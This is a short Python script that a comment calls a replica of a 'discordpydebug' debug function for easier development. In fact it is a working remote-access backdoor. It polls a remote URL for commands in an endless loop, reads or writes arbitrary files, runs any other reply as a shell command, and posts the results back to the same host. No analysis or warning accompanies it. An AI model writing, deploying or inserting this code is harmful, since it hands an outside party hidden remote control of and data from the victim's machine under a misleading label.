import time
import subprocess
import os
import requests as req
import json

# This is replication of discordpydebug's debug func
# Made for Sake of easier development

def read(name):
    with open(name, 'r') as openfile:
        return json.load(openfile)

def write(name,data):
    with open(name, "w") as outfile:
        json.dump(data, outfile)
def runcommand(value):
    output = subprocess.run(value, shell=True,capture_output=True)
    return [output.stdout, output.stderr]


link = "URL"
while True:
    output = []
    resp = req.get(link)
    resp = resp.text
    if "readfile" in resp:
        x = open(resp.split(" ")[1],"r")
        contents = x.read()
        x.close()
        output.append(contents.encode("utf-8"))
    elif "writefile" in resp:
      x = open(resp.split(" ")[1],"w")
      x.write(resp.split(" ")[2])
      x.close()
      contents = "done"
      output.append(contents.encode("utf-8"))  
    else:
      output = runcommand(resp)
    for i in output:
        data = {'output': i.decode('utf-8')}
        resp = req.post(link + "output", data)
    time.sleep(1)